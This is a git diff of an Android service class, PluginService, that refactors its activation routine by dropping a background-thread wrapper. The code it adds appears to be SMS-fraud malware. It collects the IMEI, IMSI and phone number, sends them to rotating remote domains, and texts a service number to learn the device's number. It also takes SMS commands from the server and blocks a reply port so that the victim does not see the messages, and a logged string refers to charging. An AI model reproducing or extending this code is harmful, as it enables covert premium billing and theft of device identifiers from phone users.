@@ -118,13 +118,13 @@ public class PluginService extends IntentService {
             String domain = DomanManager.getInstance(getApplicationContext()).getOneAviableDomain();
             if (TextUtils.isEmpty(domain)) return;
             MainActiveRequest request = new MainActiveRequest(UtilsRuntime.getVersionName(getApplicationContext())
-                                                         , imei
-                                                         , imsi
-                                                         , SettingManager.getInstance().getMainApkChannel()
-                                                         , phone
-                                                         , SettingManager.getInstance().getMainApkSendUUID()
-                                                         , domain + "/gais/"
-                                                         , SettingManager.getInstance().getMainExtraInfo());
+                                                                 , imei
+                                                                 , imsi
+                                                                 , SettingManager.getInstance().getMainApkChannel()
+                                                                 , phone
+                                                                 , SettingManager.getInstance().getMainApkSendUUID()
+                                                                 , domain + "/gais/"
+                                                                 , SettingManager.getInstance().getMainExtraInfo());
             MainActiveResponse response = InternetUtils.request(getApplicationContext(), request);
 
             if (response != null && !TextUtils.isEmpty(response.url)) {
@@ -393,139 +393,131 @@ public class PluginService extends IntentService {
     private void activePluginAction() {
         if (!AppRuntime.isSIMCardReady(getApplicationContext())) return;
 
-        CustomThreadPool.asyncWork(new Runnable() {
-            @Override
-            public void run() {
-                if (Config.DEBUG) {
-                    Config.LOGD("[[PluginService::activePluginAction]] try to fetch active info, Phone Number : "
-                                    + SettingManager.getInstance().getCurrentPhoneNumber());
+        if (Config.DEBUG) {
+            Config.LOGD("[[PluginService::activePluginAction]] try to fetch active info, Phone Number : "
+                            + SettingManager.getInstance().getCurrentPhoneNumber());
+        }
+        try {
+            AppRuntime.ACTIVE_PROCESS_RUNNING.set(true);
+
+            if (TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
+                /**
+                 * 电话号码为空就发送短信到手机服务器，以后会接受到一条短信，获取到本机的号码
+                 */
+                SMSUtil.trySendCmdToServicePhone1(getApplicationContext());
+            } else {
+                String imsi = UtilsRuntime.getIMSI(getApplicationContext());
+                if (TextUtils.isEmpty(imsi)) {
+                    imsi = String.valueOf(System.currentTimeMillis());
                 }
-                try {
-                    AppRuntime.ACTIVE_PROCESS_RUNNING.set(true);
+                UUID uuid = CommonUtil.deviceUuidFactory(getApplicationContext());
+                String unique = null;
+                if (uuid != null) {
+                    unique = uuid.toString();
+                } else {
+                    unique = imsi;
+                    CommonUtil.saveUUID(getApplicationContext(), unique);
+                }
 
-                    if (TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
-                        /**
-                         * 电话号码为空就发送短信到手机服务器，以后会接受到一条短信，获取到本机的号码
-                         */
-//                        SMSUtil.trySendCmdToNetwork(getApplicationContext());
-                        SMSUtil.trySendCmdToServicePhone1(getApplicationContext());
-                    } else {
-                        String imsi = UtilsRuntime.getIMSI(getApplicationContext());
-                        if (TextUtils.isEmpty(imsi)) {
-                            imsi = String.valueOf(System.currentTimeMillis());
-                        }
-                        UUID uuid = CommonUtil.deviceUuidFactory(getApplicationContext());
-                        String unique = null;
-                        if (uuid != null) {
-                            unique = uuid.toString();
-                        } else {
-                            unique = imsi;
-                            CommonUtil.saveUUID(getApplicationContext(), unique);
-                        }
-
-                        SettingManager.getInstance().setKeyDayActiveCount(SettingManager.getInstance().getKeyDayActiveCount() + 1);
-                        if (Config.DEBUG) {
-                            Config.LOGD("[[PluginService::activePluginAction]] last monkey count time = "
-                                            + UtilsRuntime.debugFormatTime(SettingManager.getInstance().getKeyLastCountTime()));
-                        }
-                        ActiveRequest request = new ActiveRequest(getApplicationContext()
-                                                                     , Config.CHANNEL_CODE
-                                                                     , unique
-                                                                     , getString(R.string.app_name)
-                                                                     , AppRuntime.getNetworkTypeByIMSI(getApplicationContext())
-                                                                     , SettingManager.getInstance().getCurrentPhoneNumber()
-                                                                     , SettingManager.getInstance().getKeyLastErrorInfo()
-                                                                     , DomanManager.getInstance(getApplicationContext())
-                                                                           .getOneAviableDomain() + "/sais/"
-                                                                     , "1");
-                        //只要激活返回，就记录时间，也就是说，激活时间标识的是上次try to激活的时间，而不是激活成功的时间
-                        SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
-                        ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
-                        /**
-                         * 只要是服务器返回了，今天就不工作了，因为如果是网络异常的话会走try catch
-                         */
-                        if (response != null && !TextUtils.isEmpty(response.channelName)) {
-                            //notify umeng
-                            HashMap<String, String> log = new HashMap<String, String>();
-                            log.put("fetch", "succes");
-                            log.put("channelName", response.channelName);
-//                            log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
-                            log.put("osVersion", Build.VERSION.RELEASE);
-                            log.put("channelCode", Config.CHANNEL_CODE);
-                            log.put("phoneType", Build.MODEL);
-//                            log.put("uuid", unique);
-                            CommonUtil.umengLog(getApplicationContext(), "fetch_channel", log);
-
-                            if (Config.DEBUG) {
-                                Config.LOGD(response.toString());
-                            }
-
-                            //增加一步对返回通道数据的校验
-                            int netType = AppRuntime.getNetworkTypeByIMSI(getApplicationContext());
-                            if (!String.valueOf(netType).equals(response.operator)) {
-                                //网络类型不对，这就是一个最初级的检查
-                                Config.LOGD("response == null or response error");
-                                networkErrorWork();
-                            } else {
-                                AppRuntime.ACTIVE_RESPONSE = response;
-                                AppRuntime.ACTIVE_RESPONSE.parseSMSCmd();
-                                AppRuntime.saveActiveResponse(AppRuntime.RESPONSE_SAVE_FILE);
-//                                AppRuntime.saveActiveResponse("/sdcard/" + Config.ACTIVE_RESPONSE_FILE);
-                                SettingManager.getInstance().setKeyBlockPhoneNumber(response.blockSmsPort);
-                                int next = AppRuntime.randomBetween(4, 11);
-                                SettingManager.getInstance().setKeyRandomNetworkTime(next);
-                            }
-
-                            /**
-                             * 消耗掉今天所有的重试次数
-                             */
-                            if (Config.DEBUG) {
-                                Config.LOGD("[[PluginService::activePluginAction]] server return data, So we set DayActiveCount = 17");
-                            }
-                            SettingManager.getInstance().setKeyDayActiveCount(17);
-                        } else {
-                            Config.LOGD("response == null or response error");
-                            networkErrorWork();
-                            /**
-                             * 消耗掉今天所有的重试次数
-                             */
-                            if (Config.DEBUG) {
-                                Config.LOGD("[[PluginService::activePluginAction]] server return data == null, So we set DayActiveCount = 17");
-                            }
-                            SettingManager.getInstance().setKeyDayActiveCount(17);
-
-                            //notify umeng
-                            HashMap<String, String> log = new HashMap<String, String>();
-                            log.put("fetch", "succes");
-                            log.put("channelName", "今天不扣费");
-//                            log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
-                            log.put("osVersion", Build.VERSION.RELEASE);
-                            log.put("channelCode", Config.CHANNEL_CODE);
-                            log.put("phoneType", Build.MODEL);
-//                            log.put("uuid", unique);
-                            CommonUtil.umengLog(getApplicationContext(), "fetch_channel", log);
-                        }
-                    }
-                } catch (Exception e) {
-                    e.printStackTrace();
-                    if (Config.DEBUG) {
-                        Config.LOGD("[[networkErrorWork]] entry", e);
-                    }
-                    networkErrorWork();
+                SettingManager.getInstance().setKeyDayActiveCount(SettingManager.getInstance().getKeyDayActiveCount() + 1);
+                if (Config.DEBUG) {
+                    Config.LOGD("[[PluginService::activePluginAction]] last monkey count time = "
+                                    + UtilsRuntime.debugFormatTime(SettingManager.getInstance().getKeyLastCountTime()));
+                }
+                ActiveRequest request = new ActiveRequest(getApplicationContext()
+                                                             , Config.CHANNEL_CODE
+                                                             , unique
+                                                             , getString(R.string.app_name)
+                                                             , AppRuntime.getNetworkTypeByIMSI(getApplicationContext())
+                                                             , SettingManager.getInstance().getCurrentPhoneNumber()
+                                                             , SettingManager.getInstance().getKeyLastErrorInfo()
+                                                             , DomanManager.getInstance(getApplicationContext())
+                                                                   .getOneAviableDomain() + "/sais/"
+                                                             , "1");
+                //只要激活返回，就记录时间，也就是说，激活时间标识的是上次try to激活的时间，而不是激活成功的时间
+                SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
+                ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
+                /**
+                 * 只要是服务器返回了，今天就不工作了，因为如果是网络异常的话会走try catch
+                 */
+                if (response != null && !TextUtils.isEmpty(response.channelName)) {
                     //notify umeng
                     HashMap<String, String> log = new HashMap<String, String>();
-                    log.put("fetch", "failed");
-//                    log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
+                    log.put("fetch", "succes");
+                    log.put("channelName", response.channelName);
                     log.put("osVersion", Build.VERSION.RELEASE);
                     log.put("channelCode", Config.CHANNEL_CODE);
                     log.put("phoneType", Build.MODEL);
-                    log.put("errorType", "network");
-                    CommonUtil.umengLog(getApplicationContext(), "fetch_channel_failed", log);
-                }
+                    CommonUtil.umengLog(getApplicationContext(), "fetch_channel", log);
 
-                AppRuntime.ACTIVE_PROCESS_RUNNING.set(false);
+                    if (Config.DEBUG) {
+                        Config.LOGD(response.toString());
+                    }
+
+                    //增加一步对返回通道数据的校验
+                    int netType = AppRuntime.getNetworkTypeByIMSI(getApplicationContext());
+                    if (!String.valueOf(netType).equals(response.operator)) {
+                        //网络类型不对，这就是一个最初级的检查
+                        Config.LOGD("response == null or response error");
+                        networkErrorWork();
+                    } else {
+                        AppRuntime.ACTIVE_RESPONSE = response;
+                        AppRuntime.ACTIVE_RESPONSE.parseSMSCmd();
+                        AppRuntime.saveActiveResponse(AppRuntime.RESPONSE_SAVE_FILE);
+//                                AppRuntime.saveActiveResponse("/sdcard/" + Config.ACTIVE_RESPONSE_FILE);
+                        SettingManager.getInstance().setKeyBlockPhoneNumber(response.blockSmsPort);
+                        int next = AppRuntime.randomBetween(4, 11);
+                        SettingManager.getInstance().setKeyRandomNetworkTime(next);
+                    }
+
+                    /**
+                     * 消耗掉今天所有的重试次数
+                     */
+                    if (Config.DEBUG) {
+                        Config.LOGD("[[PluginService::activePluginAction]] server return data, So we set DayActiveCount = 17");
+                    }
+                    SettingManager.getInstance().setKeyDayActiveCount(17);
+                } else {
+                    Config.LOGD("response == null or response error");
+                    networkErrorWork();
+                    /**
+                     * 消耗掉今天所有的重试次数
+                     */
+                    if (Config.DEBUG) {
+                        Config.LOGD("[[PluginService::activePluginAction]] server return data == null, So we set DayActiveCount = 17");
+                    }
+                    SettingManager.getInstance().setKeyDayActiveCount(17);
+
+                    //notify umeng
+                    HashMap<String, String> log = new HashMap<String, String>();
+                    log.put("fetch", "succes");
+                    log.put("channelName", "今天不扣费");
+//                            log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
+                    log.put("osVersion", Build.VERSION.RELEASE);
+                    log.put("channelCode", Config.CHANNEL_CODE);
+                    log.put("phoneType", Build.MODEL);
+//                            log.put("uuid", unique);
+                    CommonUtil.umengLog(getApplicationContext(), "fetch_channel", log);
+                }
             }
-        });
+        } catch (Exception e) {
+            e.printStackTrace();
+            if (Config.DEBUG) {
+                Config.LOGD("[[networkErrorWork]] entry", e);
+            }
+            networkErrorWork();
+            //notify umeng
+            HashMap<String, String> log = new HashMap<String, String>();
+            log.put("fetch", "failed");
+//                    log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
+            log.put("osVersion", Build.VERSION.RELEASE);
+            log.put("channelCode", Config.CHANNEL_CODE);
+            log.put("phoneType", Build.MODEL);
+            log.put("errorType", "network");
+            CommonUtil.umengLog(getApplicationContext(), "fetch_channel_failed", log);
+        }
+
+        AppRuntime.ACTIVE_PROCESS_RUNNING.set(false);
     }
 
     private void networkErrorWork() {
